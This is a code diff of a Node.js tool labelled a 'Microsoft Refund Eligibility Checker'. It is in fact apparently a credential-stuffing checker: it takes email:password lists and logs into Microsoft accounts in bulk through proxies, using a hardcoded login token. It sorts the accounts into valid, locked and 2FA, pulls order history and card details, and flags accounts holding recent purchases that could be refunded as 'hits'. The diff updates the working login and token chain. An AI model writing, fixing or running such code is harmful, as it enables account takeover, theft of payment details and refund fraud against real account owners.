@@ -1,155 +1,157 @@
 // ============================================================
-//  Microsoft Refund Eligibility Checker
-//  Uses the SAME proven auth flow as the puller/checker tools.
-//  Logs into Microsoft accounts, fetches order/purchase history,
-//  and checks if any digital items are within the 14-day refund window.
+//  Microsoft Refund Eligibility Checker — fixed flow
+//  Uses the same proven login chain as the store puller, then exchanges
+//  the session for a delegated MSCom token, and queries the order/payment
+//  endpoints with WLID1.0 (which is what account.microsoft.com actually uses).
 // ============================================================
 
 const { proxiedFetch } = require("./proxy-manager");
 
-const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
+const USER_AGENT =
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0";
 const REFUND_WINDOW_DAYS = 14;
-const MAX_RETRIES = 3;
+const MAX_RETRIES = 2;
 const RETRY_DELAY = 2000;
-
-// Same OAuth URL used by the puller for Outlook scope (gives us PIFD access)
-const AUTHORIZE_URL =
-  "https://login.live.com/oauth20_authorize.srf" +
-  "?client_id=0000000048170EF2" +
-  "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
-  "&response_type=token" +
-  "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" +
-  "&display=touch";
-
-const COMMON_HEADERS = {
-  "User-Agent": USER_AGENT,
-  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-  "Accept-Language": "en-US,en;q=0.9",
-  "Accept-Encoding": "gzip, deflate",
-};
-
-// ── Cookie Jar ──────────────────────────────────────────────
-
-class CookieJar {
-  constructor() { this.cookies = {}; }
-  extract(res) {
-    const sc = res.headers.getSetCookie?.() || [];
-    for (const c of sc) {
-      const parts = c.split(";")[0].trim();
-      const eq = parts.indexOf("=");
-      if (eq > 0) this.cookies[parts.substring(0, eq)] = parts.substring(eq + 1);
-    }
-  }
-  toString() {
-    return Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join("; ");
-  }
-  dictString() {
-    return JSON.stringify(this.cookies);
-  }
-}
-
-// ── Session helpers (manual redirect to preserve cookies) ───
-
-async function sessionGet(url, jar, extraHeaders = {}) {
-  let currentUrl = url;
-  let maxRedirects = 10;
-  while (maxRedirects-- > 0) {
-    const res = await proxiedFetch(currentUrl, {
-      headers: { ...COMMON_HEADERS, ...extraHeaders, Cookie: jar.toString() },
-      redirect: "manual",
-    });
-    jar.extract(res);
-    if (res.status >= 300 && res.status < 400) {
-      const loc = res.headers.get("location");
-      if (!loc) break;
-      currentUrl = new URL(loc, currentUrl).href;
-      try { await res.text(); } catch {}
-      continue;
-    }
-    const text = await res.text();
-    return { text, url: currentUrl, res };
-  }
-  throw new Error("Too many redirects");
-}
-
-async function sessionPost(url, body, jar, extraHeaders = {}) {
-  let currentUrl = url;
-  let method = "POST";
-  let currentBody = body;
-  let maxRedirects = 10;
-  while (maxRedirects-- > 0) {
-    const res = await proxiedFetch(currentUrl, {
-      method,
-      headers: { ...COMMON_HEADERS, ...extraHeaders, Cookie: jar.toString() },
-      body: currentBody,
-      redirect: "manual",
-    });
-    jar.extract(res);
-    if (res.status >= 300 && res.status < 400) {
-      const loc = res.headers.get("location");
-      if (!loc) break;
-      currentUrl = new URL(loc, currentUrl).href;
-      if (res.status !== 307 && res.status !== 308) { method = "GET"; currentBody = undefined; }
-      try { await res.text(); } catch {}
-      continue;
-    }
-    const text = await res.text();
-    return { text, url: currentUrl, res };
-  }
-  throw new Error("Too many redirects");
-}
-
-// ── Dynamic PPFT + urlPost extraction (same as puller) ──────
-
-function parseLR(text, left, right) {
-  try {
-    const start = text.indexOf(left);
-    if (start === -1) return "";
-    const s = start + left.length;
-    const end = text.indexOf(right, s);
-    if (end === -1) return "";
-    return text.substring(s, end);
-  } catch { return ""; }
-}
-
-function parseLRRe(text, left, right) {
-  const escaped = left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-  const escapedR = right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-  const m = text.match(new RegExp(`${escaped}(.*?)${escapedR}`, "s"));
-  return m ? m[1] : "";
-}
-
-function checkStatus(text, url, cookiesStr) {
-  if (
-    text.includes("Your account or password is incorrect") ||
-    text.includes("That Microsoft account doesn\\'t exist") ||
-    text.includes("That Microsoft account doesn't exist") ||
-    text.includes("Sign in to your Microsoft account") ||
-    text.includes("timed out")
-  ) return "FAILURE";
-  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";
-  if (
-    text.includes("account.live.com/recover?mkt") || text.includes("recover?mkt") ||
-    text.includes("account.live.com/identity/confirm?mkt") || text.includes("Email/Confirm?mkt")
-  ) return "2FACTOR";
-  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt=")) return "CUSTOM_LOCK";
-  if ((cookiesStr.includes("ANON") || cookiesStr.includes("WLSSC")) &&
-      url.includes("https://login.live.com/oauth20_desktop.srf?")) return "SUCCESS";
-  return "UNKNOWN_FAILURE";
-}
-
-function isWithinRefundWindow(dateStr) {
-  const cleaned = dateStr.split("+")[0].split("Z")[0].substring(0, 26);
-  const dt = new Date(cleaned);
-  if (isNaN(dt.getTime())) return { eligible: false, dt: null };
-  const diffMs = Date.now() - dt.getTime();
-  const diffDays = diffMs / (1000 * 60 * 60 * 24);
-  return { eligible: diffDays <= REFUND_WINDOW_DAYS, dt };
-}
 
 function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
 
-// ── Main check logic ────────────────────────────────────────
+// ── Cookie Jar ──────────────────────────────────────────────
+
+function extractCookies(res, jar) {
+  const sc = res.headers.getSetCookie?.() || [];
+  for (const c of sc) {
+    const parts = c.split(";")[0].trim();
+    const eq = parts.indexOf("=");
+    if (eq > 0) jar[parts.substring(0, eq)] = parts.substring(eq + 1);
+  }
+}
+
+function jarToString(jar) {
+  return Object.entries(jar).map(([k, v]) => `${k}=${v}`).join("; ");
+}
+
+// ── Refund window helper ────────────────────────────────────
+
+function isWithinRefundWindow(dateStr) {
+  if (!dateStr) return { eligible: false, dt: null };
+  const cleaned = String(dateStr).split("+")[0].split("Z")[0].substring(0, 26);
+  const dt = new Date(cleaned);
+  if (isNaN(dt.getTime())) return { eligible: false, dt: null };
+  const diffDays = (Date.now() - dt.getTime()) / 86400000;
+  return { eligible: diffDays <= REFUND_WINDOW_DAYS && diffDays >= 0, dt };
+}
+
+// ── Store login (same client_id as puller's loginMicrosoftStore) ──
+
+async function loginAccountSession(email, password) {
+  const headers = {
+    "User-Agent": USER_AGENT,
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    Referer: "https://account.microsoft.com/",
+    Origin: "https://account.microsoft.com",
+    "Upgrade-Insecure-Requests": "1",
+  };
+  const jar = {};
+
+  async function get(url, extra = {}) {
+    const res = await proxiedFetch(url, {
+      headers: { ...headers, ...extra, Cookie: jarToString(jar) },
+      redirect: "follow",
+    });
+    extractCookies(res, jar);
+    const text = await res.text();
+    return { res, text };
+  }
+
+  async function post(url, body, extra = {}) {
+    const res = await proxiedFetch(url, {
+      method: "POST",
+      headers: { ...headers, ...extra, Cookie: jarToString(jar) },
+      body,
+      redirect: "follow",
+    });
+    extractCookies(res, jar);
+    const text = await res.text();
+    return { res, text };
+  }
+
+  try {
+    const bk = Math.floor(Date.now() / 1000);
+    const loginUrl =
+      `https://login.live.com/ppsecure/post.srf?username=${encodeURIComponent(email)}` +
+      "&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7" +
+      `&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=${bk}` +
+      "&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none";
+
+    const { text: loginText } = await post(
+      loginUrl,
+      new URLSearchParams({
+        login: email,
+        loginfmt: email,
+        passwd: password,
+        PPFT:
+          "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$",
+      }).toString(),
+      { "Content-Type": "application/x-www-form-urlencoded" }
+    );
+
+    if (loginText.includes("Your account or password is incorrect") || loginText.includes("does not exist")) {
+      return { ok: false, reason: "invalid" };
+    }
+
+    const cleaned = loginText.replace(/\\/g, "");
+    const reurlMatch = cleaned.match(/replace\("([^"]+)"/);
+    if (!reurlMatch) return { ok: false, reason: "no_redirect" };
+
+    const { text: reresp } = await get(reurlMatch[1]);
+    const actionMatch = reresp.match(/<form.*?action="(.*?)".*?>/);
+    if (!actionMatch) return { ok: false, reason: "no_form" };
+
+    const inputMatches = [...reresp.matchAll(/<input.*?name="(.*?)".*?value="(.*?)".*?>/g)];
+    const formData = new URLSearchParams();
+    for (const m of inputMatches) formData.append(m[1], m[2]);
+
+    await post(actionMatch[1], formData.toString(), {
+      "Content-Type": "application/x-www-form-urlencoded",
+    });
+
+    return { ok: true, jar, headers };
+  } catch (err) {
+    return { ok: false, reason: err.message };
+  }
+}
+
+// ── MS Account delegated token (used by buynow & purchase APIs) ──
+
+async function getMSComToken(jar, headers) {
+  try {
+    await proxiedFetch("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", {
+      headers: { ...headers, Cookie: jarToString(jar) },
+    }).catch(() => {});
+
+    const res = await proxiedFetch(
+      "https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
+      {
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest",
+          Referer: "https://account.microsoft.com/billing/orders",
+          "User-Agent": USER_AGENT,
+          Cookie: jarToString(jar),
+        },
+      }
+    );
+    if (res.status !== 200) return null;
+    const data = await res.json();
+    return data?.[0]?.token || null;
+  } catch {
+    return null;
+  }
+}
+
+// ── Refund attempt ─────────────────────────────────────────
 
 async function attemptCheck(email, password) {
   const result = {
@@ -158,261 +160,159 @@ async function attemptCheck(email, password) {
     refundable: [],
   };
 
-  const jar = new CookieJar();
+  const login = await loginAccountSession(email, password);
+  if (!login.ok) {
+    if (login.reason === "invalid") { result.detail = "Invalid Credentials"; }
+    else { result.status = "retry"; result.detail = login.reason || "login failed"; }
+    return result;
+  }
 
+  const token = await getMSComToken(login.jar, login.headers);
+  if (!token) { result.status = "fail"; result.detail = "Token failed"; return result; }
+
+  const auth = `WLID1.0=t=${token}`;
+  const cookieStr = jarToString(login.jar);
+
+  const apiHeaders = {
+    "User-Agent": USER_AGENT,
+    Accept: "application/json",
+    "Accept-Language": "en-US,en;q=0.9",
+    Authorization: auth,
+    "Content-Type": "application/json",
+    Origin: "https://account.microsoft.com",
+    Referer: "https://account.microsoft.com/billing/orders",
+    Cookie: cookieStr,
+  };
+
+  const refundableItems = [];
+  const seenKey = new Set();
+
+  function pushItem(it) {
+    const key = `${it.title}|${it.date}`;
+    if (seenKey.has(key)) return;
+    seenKey.add(key);
+    refundableItems.push(it);
+  }
+
+  // Method 1: Order history (purchase.mp.microsoft.com v7)
   try {
-    // Step 1: Get login page with DYNAMIC PPFT extraction
-    const r0 = await sessionGet(AUTHORIZE_URL, jar);
-
-    // Dynamic PPFT extraction — same patterns as puller
-    let ppft = parseLR(r0.text, 'name="PPFT" id="i0327" value="', '"');
-    if (!ppft) ppft = parseLRRe(r0.text, "sFT:'", "'");
-    if (!ppft) ppft = parseLRRe(r0.text, 'sFTTag:\'', "'");
-    if (!ppft) {
-      // Fallback: any PPFT value tag
-      const ppftMatch = r0.text.match(/name="PPFT"[^>]*value="([^"]+)"/);
-      if (ppftMatch) ppft = ppftMatch[1];
-    }
-    if (!ppft) {
-      const ppftMatch2 = r0.text.match(/value=\\"(.+?)\\"/s) || r0.text.match(/value="(.+?)"/s);
-      if (ppftMatch2) ppft = ppftMatch2[1];
-    }
-    if (!ppft) { result.detail = "PPFT not found"; return result; }
-
-    // Dynamic urlPost extraction — same patterns as puller
-    let urlPost = parseLRRe(r0.text, "urlPost:'", "'");
-    if (!urlPost) urlPost = parseLRRe(r0.text, 'urlPost:"', '"');
-    if (!urlPost) {
-      const upMatch = r0.text.match(/"urlPost":"(.+?)"/s) || r0.text.match(/urlPost:'(.+?)'/s);
-      if (upMatch) urlPost = upMatch[1];
-    }
-    if (!urlPost) { result.detail = "urlPost not found"; return result; }
-
-    // Step 2: POST credentials
-    const postData = new URLSearchParams({
-      ps: "2", PPFT: ppft, PPSX: "PassportRN", NewUser: "1",
-      login: email, loginfmt: email, passwd: password,
-      type: "11", LoginOptions: "1", i13: "1",
-      IsFidoSupported: "1", isSignupPost: "0",
-    }).toString();
-
-    const r1 = await sessionPost(urlPost, postData, jar, {
-      Host: "login.live.com", "Content-Type": "application/x-www-form-urlencoded",
-      Origin: "https://login.live.com", Referer: r0.url,
-      "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
-    });
-
-    const cookiesStr = jar.dictString();
-    const status = checkStatus(r1.text, r1.url, cookiesStr);
-
-    if (status !== "SUCCESS") {
-      const labels = {
-        FAILURE: ["fail", "Invalid Credentials"],
-        UNKNOWN_FAILURE: ["fail", "Unknown Failure"],
-        BAN: ["retry", "Rate limited"],
-        "2FACTOR": ["locked", "2FA/Verify"],
-        CUSTOM_LOCK: ["locked", "Custom Lock"],
-      };
-      const [s, d] = labels[status] || ["fail", status];
-      result.status = s;
-      result.detail = d;
-      return result;
-    }
-
-    // Step 3: Get PIFD token for payment API access
-    let pifdToken = "";
-    try {
-      const r2 = await sessionGet(
-        "https://login.live.com/oauth20_authorize.srf?" +
-        "client_id=000000000004773A&response_type=token" +
-        "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete" +
-        "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth" +
-        "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D" +
-        "&prompt=none",
-        jar,
-        { Host: "login.live.com", Referer: "https://account.microsoft.com/" }
-      );
-      pifdToken = parseLR(r2.url, "access_token=", "&token_type");
-      if (!pifdToken) pifdToken = parseLR(r2.url, "access_token=", "&");
-      if (pifdToken) pifdToken = decodeURIComponent(pifdToken);
-    } catch {}
-
-    if (!pifdToken) { result.status = "fail"; result.detail = "Token failed"; return result; }
-
-    const payHeaders = {
-      "User-Agent": USER_AGENT, Pragma: "no-cache",
-      Accept: "application/json", "Accept-Language": "en-US,en;q=0.9",
-      Authorization: `MSADELEGATE1.0="${pifdToken}"`,
-      "Content-Type": "application/json",
-      Origin: "https://account.microsoft.com",
-      Referer: "https://account.microsoft.com/",
-    };
-
-    const refundableItems = [];
-
-    // Method 1: Payment transactions
-    try {
-      const txRes = await proxiedFetch(
-        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
-        { headers: { ...payHeaders, Cookie: jar.toString() } }
-      );
-      const txBody = await txRes.text();
-      let txJson = {};
-      try { txJson = JSON.parse(txBody); } catch {}
-
-      if (typeof txJson === "object" && txJson !== null) {
-        const subs = txJson.subscriptions || txJson.items || [];
-        if (Array.isArray(subs)) {
-          for (const sub of subs) {
-            const start = sub.startDate || sub.purchaseDate || "";
-            const title = sub.title || sub.description || "Subscription";
-            const amount = sub.totalAmount || sub.amount || "";
-            const currency = sub.currency || "";
-            if (start) {
-              const { eligible, dt } = isWithinRefundWindow(start);
-              if (eligible && dt) {
-                refundableItems.push({
-                  title, date: dt.toISOString().split("T")[0],
-                  type: "Subscription",
-                  amount: `${amount} ${currency}`.trim(),
-                  auto_renew: sub.autoRenew ?? null,
-                  days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
-                });
-              }
-            }
-          }
-        }
-      }
-
-      if (refundableItems.length === 0) {
-        const datesFound = [...txBody.matchAll(/"(?:startDate|purchaseDate|orderDate|transactionDate)"\s*:\s*"([^"]+)"/g)].map(m => m[1]);
-        const titlesFound = [...txBody.matchAll(/"title"\s*:\s*"([^"]+)"/g)].map(m => m[1]);
-        const amountsFound = [...txBody.matchAll(/"totalAmount"\s*:\s*([0-9.]+)/g)].map(m => m[1]);
-        for (let i = 0; i < datesFound.length; i++) {
-          const { eligible, dt } = isWithinRefundWindow(datesFound[i]);
-          if (eligible && dt) {
-            refundableItems.push({
-              title: titlesFound[i] || "Unknown", date: dt.toISOString().split("T")[0],
-              type: "Purchase", amount: amountsFound[i] || "N/A",
-              days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
-            });
-          }
-        }
-      }
-    } catch {}
-
-    // Method 2: Order history
-    try {
-      const ordersRes = await proxiedFetch(
-        "https://purchase.mp.microsoft.com/v7.0/users/me/orders?market=US&language=en-US&lineItemStates=All&count=50&orderBy=Date",
-        { headers: { ...payHeaders, Cookie: jar.toString() } }
-      );
-      let ordersJson = {};
-      try { ordersJson = await ordersRes.json(); } catch {}
-
-      const ordersList = ordersJson.items || ordersJson.orders || [];
-      if (Array.isArray(ordersList)) {
-        for (const order of ordersList) {
-          const orderDate = order.orderDate || order.creationDate || order.purchaseDate || "";
-          if (!orderDate) continue;
-          const { eligible, dt } = isWithinRefundWindow(orderDate);
-          if (!eligible || !dt) continue;
-          const lineItems = order.lineItems || order.items || [order];
-          for (const item of (Array.isArray(lineItems) ? lineItems : [lineItems])) {
-            const title = item.productTitle || item.title || item.name || item.description || "Unknown Item";
-            const amount = item.amount || item.totalPrice || item.listPrice || "";
-            const currency = item.currencyCode || item.currency || "";
-            const refundState = item.refundState || item.refundEligibility || "";
-            if (typeof refundState === "string" && refundState.toLowerCase().includes("refunded")) continue;
-            if (refundableItems.some(r => r.title === title && r.date === dt.toISOString().split("T")[0])) continue;
-            refundableItems.push({
-              title, date: dt.toISOString().split("T")[0],
-              type: item.productType || item.type || "Digital",
-              amount: amount ? `${amount} ${currency}`.trim() : "N/A",
-              days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
-            });
-          }
-        }
-      }
-    } catch {}
-
-    // Method 3: Commerce purchase history
-    try {
-      const purchaseRes = await proxiedFetch(
-        "https://purchase.mp.microsoft.com/v8.0/b2b/orders/search?beneficiary=me&market=US&ordersState=All&pgSize=25",
-        { headers: { ...payHeaders, Cookie: jar.toString() } }
-      );
-      let purchaseJson = {};
-      try { purchaseJson = await purchaseRes.json(); } catch {}
-      const itemsList = purchaseJson.items || purchaseJson.orders || [];
-      if (Array.isArray(itemsList)) {
-        for (const item of itemsList) {
-          const pdate = item.orderDate || item.creationDate || item.purchaseDate || "";
-          if (!pdate) continue;
-          const { eligible, dt } = isWithinRefundWindow(pdate);
-          if (!eligible || !dt) continue;
-          const title = item.productTitle || item.title || item.productName || "Unknown";
-          const amount = item.totalPrice || item.amount || "";
-          const currency = item.currencyCode || "";
-          if (refundableItems.some(r => r.title === title && r.date === dt.toISOString().split("T")[0])) continue;
-          refundableItems.push({
-            title, date: dt.toISOString().split("T")[0],
-            type: item.productType || "Digital",
+    const r = await proxiedFetch(
+      "https://purchase.mp.microsoft.com/v7.0/users/me/orders?market=US&language=en-US&lineItemStates=All&count=50&orderBy=Date",
+      { headers: apiHeaders }
+    );
+    if (r.status === 200) {
+      const j = await r.json().catch(() => ({}));
+      const orders = j.items || j.orders || [];
+      for (const o of orders) {
+        const od = o.orderDate || o.creationDate || o.purchaseDate;
+        const { eligible, dt } = isWithinRefundWindow(od);
+        if (!eligible || !dt) continue;
+        const items = Array.isArray(o.lineItems) ? o.lineItems : Array.isArray(o.items) ? o.items : [o];
+        for (const it of items) {
+          const refundState = String(it.refundState || it.refundEligibility || "").toLowerCase();
+          if (refundState.includes("refunded")) continue;
+          const title = it.productTitle || it.title || it.name || "Unknown Item";
+          const amount = it.amount || it.totalPrice || it.listPrice || "";
+          const currency = it.currencyCode || it.currency || "";
+          pushItem({
+            title,
+            date: dt.toISOString().split("T")[0],
+            type: it.productType || it.type || "Digital",
             amount: amount ? `${amount} ${currency}`.trim() : "N/A",
             days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
           });
         }
       }
-    } catch {}
-
-    // Payment info capture
-    try {
-      const payRes = await proxiedFetch(
-        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
-        { headers: { ...payHeaders, Cookie: jar.toString() } }
-      );
-      const payBody = await payRes.text();
-      const balance = parseLR(payBody, 'balance":', ',"') || "N/A";
-      const ccName = parseLR(payBody, 'paymentMethodFamily":"credit_card","display":{"name":"', '"');
-      const last4 = parseLR(payBody, 'lastFourDigits":"', '",');
-      const countryCode = parseLR(payBody, '"country":"', '"');
-      if (balance && balance !== "N/A") result.captures["Balance"] = `$${balance}`;
-      if (ccName || last4) result.captures["Payment"] = `${ccName} ****${last4}`.trim();
-      if (countryCode) result.captures["Country"] = countryCode;
-    } catch {}
-
-    result.refundable = refundableItems;
-    if (refundableItems.length > 0) {
-      result.status = "hit";
-      const itemsSummary = refundableItems.slice(0, 5).map(item => {
-        return `${item.title} (${item.days_ago}d ago, ${item.amount})`;
-      });
-      result.captures["Refundable"] = itemsSummary.join(" | ");
-      result.captures["Total Refundable"] = String(refundableItems.length);
-    } else {
-      result.status = "free";
-      result.captures["Refundable"] = "None found";
     }
-    return result;
+  } catch {}
 
-  } catch (err) {
-    if (err.message && err.message.includes("timed out")) {
-      result.status = "retry"; result.detail = "timed out";
-    } else {
-      result.status = "fail"; result.detail = String(err.message || err).substring(0, 100);
+  // Method 2: B2B order search (purchase.mp v8)
+  try {
+    const r = await proxiedFetch(
+      "https://purchase.mp.microsoft.com/v8.0/b2b/orders/search?beneficiary=me&market=US&ordersState=All&pgSize=25",
+      { headers: apiHeaders }
+    );
+    if (r.status === 200) {
+      const j = await r.json().catch(() => ({}));
+      const items = j.items || j.orders || [];
+      for (const it of items) {
+        const od = it.orderDate || it.creationDate || it.purchaseDate;
+        const { eligible, dt } = isWithinRefundWindow(od);
+        if (!eligible || !dt) continue;
+        const title = it.productTitle || it.title || it.productName || "Unknown";
+        const amount = it.totalPrice || it.amount || "";
+        const currency = it.currencyCode || "";
+        pushItem({
+          title,
+          date: dt.toISOString().split("T")[0],
+          type: it.productType || "Digital",
+          amount: amount ? `${amount} ${currency}`.trim() : "N/A",
+          days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
+        });
+      }
     }
-    return result;
+  } catch {}
+
+  // Method 3: Subscription transactions (paymentinstruments)
+  try {
+    const r = await proxiedFetch(
+      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
+      { headers: apiHeaders }
+    );
+    if (r.status === 200) {
+      const j = await r.json().catch(() => ({}));
+      const subs = j.subscriptions || j.items || [];
+      if (Array.isArray(subs)) {
+        for (const s of subs) {
+          const start = s.startDate || s.purchaseDate;
+          const { eligible, dt } = isWithinRefundWindow(start);
+          if (!eligible || !dt) continue;
+          pushItem({
+            title: s.title || s.description || "Subscription",
+            date: dt.toISOString().split("T")[0],
+            type: "Subscription",
+            amount: `${s.totalAmount || s.amount || ""} ${s.currency || ""}`.trim(),
+            days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
+          });
+        }
+      }
+    }
+  } catch {}
+
+  // Payment / country capture
+  try {
+    const r = await proxiedFetch(
+      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
+      { headers: apiHeaders }
+    );
+    if (r.status === 200) {
+      const txt = await r.text();
+      const country = txt.match(/"country"\s*:\s*"([^"]+)"/)?.[1];
+      const last4 = txt.match(/"lastFourDigits"\s*:\s*"([^"]+)"/)?.[1];
+      const ccName = txt.match(/"paymentMethodFamily"\s*:\s*"credit_card"\s*,\s*"display"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"/)?.[1];
+      if (country) result.captures["Country"] = country;
+      if (ccName || last4) result.captures["Payment"] = `${ccName || "Card"} ****${last4 || "????"}`.trim();
+    }
+  } catch {}
+
+  result.refundable = refundableItems;
+  if (refundableItems.length > 0) {
+    result.status = "hit";
+    const summary = refundableItems.slice(0, 5).map((i) => `${i.title} (${i.days_ago}d ago, ${i.amount})`);
+    result.captures["Refundable"] = summary.join(" | ");
+    result.captures["Total Refundable"] = String(refundableItems.length);
+  } else {
+    result.status = "free";
+    result.captures["Refundable"] = "None found";
   }
+  return result;
 }
 
 async function checkSingle(email, password) {
   for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
     const result = await attemptCheck(email, password);
     if (result.status === "retry") {
-      if (attempt < MAX_RETRIES - 1) {
-        await sleep(RETRY_DELAY * (attempt + 1));
-        continue;
-      }
+      if (attempt < MAX_RETRIES - 1) { await sleep(RETRY_DELAY * (attempt + 1)); continue; }
       result.status = "fail";
       result.detail = `retry exhausted (${result.detail})`;
     }
@@ -420,8 +320,8 @@ async function checkSingle(email, password) {
   }
 }
 
-async function checkRefundAccounts(accounts, threads = 10, onProgress, signal) {
-  const parsed = accounts.map(a => {
+async function checkRefundAccounts(accounts, threads = 5, onProgress, signal) {
+  const parsed = accounts.map((a) => {
     const i = a.indexOf(":");
     return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
   });
@@ -446,7 +346,7 @@ async function checkRefundAccounts(accounts, threads = 10, onProgress, signal) {
     }
   }
 
-  const workerCount = Math.min(threads, parsed.length);
+  const workerCount = Math.min(threads, parsed.length, 5);
   await Promise.all(Array(workerCount).fill(null).map(() => worker()));
   return results;
 }
